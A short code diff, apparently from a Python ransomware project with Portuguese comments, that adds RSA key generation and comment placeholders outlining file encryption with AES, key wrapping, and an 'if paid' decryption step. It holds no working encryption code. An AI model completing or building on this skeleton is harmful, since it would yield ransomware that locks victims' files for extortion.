@@ -91,3 +91,19 @@ if __name__=="__main__":
     # gera a senha AES
     senha_AES=gera_chave_AES()
     # gera a senha RSA
+    senha_RSA=gera_chaves_RSA()
+    # criptografa todos os arquivos com AES
+
+    # criptografa a chave AES
+
+    # criptografa a chave privada RSA
+
+
+    ############### SE PAGAR #####################
+
+
+    # descriptografa a chave privada (R) com a chave privada(S)
+
+    # descriptografa a chave AES, com a chave privada (R)
+
+    # descriptografa todos os arquivos com a chave AES
